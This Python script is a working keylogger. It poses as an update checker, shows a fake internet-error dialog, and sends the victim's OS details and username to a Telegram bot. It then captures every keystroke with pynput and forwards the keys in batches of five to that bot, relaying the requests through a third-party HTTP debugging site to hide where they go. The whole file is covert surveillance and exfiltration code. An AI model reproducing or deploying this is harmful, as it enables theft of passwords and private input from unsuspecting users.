from pynput import keyboard
import requests,platform,os
import getpass,ctypes

try:
    requests.get("https://google.com")
except requests.exceptions.ConnectionError:
    messageBox = ctypes.windll.user32.MessageBoxW

    returnValue = messageBox(0,"Turn on your internet to check for updates","INTERNET ERROR",0x10 | 0x0)

    exit()

list = []

tokn = TOKEN
user = USERINFO

def target_platform():

    target = ("Connected!\n"+"Os Name : "+platform.uname()[0]+"|"+"Version : "+platform.uname()[2]+"|"+"Username : "+getpass.getuser())
    
    url_platform = (f"https://api.telegram.org/bot{tokn}/sendmessage?chat_id={user}&text="+str(target))

    payload_platform = {"UrlBox":url_platform,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req_platform = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_platform)

def key_start():
    with keyboard.Listener(on_press=key_log) as listn:
        listn.join()

def key_log(key):
    if type(key) == keyboard._win32.KeyCode:
        key = key.char
    
    key = str(key)
    list.append(key)

    if len(list) == 5:
        send_msg(str(list))
        list.clear()

    print(type(key))
def send_msg(data):

    url_key = (f"https://api.telegram.org/bot{tokn}/sendmessage?chat_id={user}&text="+data)

    payload_key = {"UrlBox":url_key,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req_key = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_key)
    
target_platform()
key_start()